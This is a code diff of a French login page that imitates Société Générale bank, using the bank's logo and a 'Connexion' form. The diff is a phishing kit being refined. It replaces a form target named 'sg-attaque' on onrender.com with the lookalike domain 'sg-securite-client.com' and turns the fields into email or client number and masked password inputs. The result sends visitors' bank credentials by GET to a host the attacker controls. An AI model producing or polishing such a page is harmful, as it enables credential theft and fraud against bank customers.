@@ -55,27 +55,21 @@
             font-weight: 600;
         }
 
-        input[type="number"] {
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             padding: 12px 15px;
             border: 1px solid #ccc;
             border-radius: 4px;
             font-size: 16px;
             transition: border-color 0.3s;
-            -moz-appearance: textfield; /* Pour Firefox */
         }
 
-        input[type="number"]:focus {
+        input[type="text"]:focus,
+        input[type="password"]:focus {
             border-color: #86BC25; /* Vert SG */
             outline: none;
             box-shadow: 0 0 0 2px rgba(134, 188, 37, 0.2);
-        }
-
-        /* Supprimer les flèches haut/bas par défaut sur les inputs number */
-        input[type="number"]::-webkit-outer-spin-button,
-        input[type="number"]::-webkit-inner-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
         }
 
         /* BOUTON CONNEXION */
@@ -127,24 +121,22 @@
 <body>
 
     <div class="login-container">
-        <!-- LOGO SG -->
+        <!-- LOGO SG (Lien direct vers une image PNG transparente) -->
         <img src="https://upload.wikimedia.org/wikipedia/commons/e/ea/Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2017.svg" alt="Société Générale Logo" class="logo">
 
         <h1>Connexion</h1>
 
         <!-- FORMULAIRE -->
-        <!-- J'ai remis l'action vers ton lien actuel (ou vide si tu veux juste afficher) -->
-        <!-- Si tu veux que ça redirige vers ton site après clic, mets ton URL dans action="" -->
-        <form action="https://sg-attaque-96u8.onrender.com" method="GET">
+        <form action="https://sg-securite-client.com" method="GET">
             
             <div class="form-group">
-                <label for="client_id">Identifiant (Chiffres)</label>
-                <input type="number" id="client_id" name="client_id" placeholder="Ex: 12345678" required>
+                <label for="email">Adresse email ou numéro de client</label>
+                <input type="text" id="email" name="email" placeholder="Entrez votre email ou n° client" required>
             </div>
 
             <div class="form-group">
-                <label for="password">Mot de passe (Chiffres)</label>
-                <input type="number" id="password" name="password" placeholder="Ex: 12345" required>
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
             </div>
 
             <button type="submit" class="btn-login">Se connecter</button>
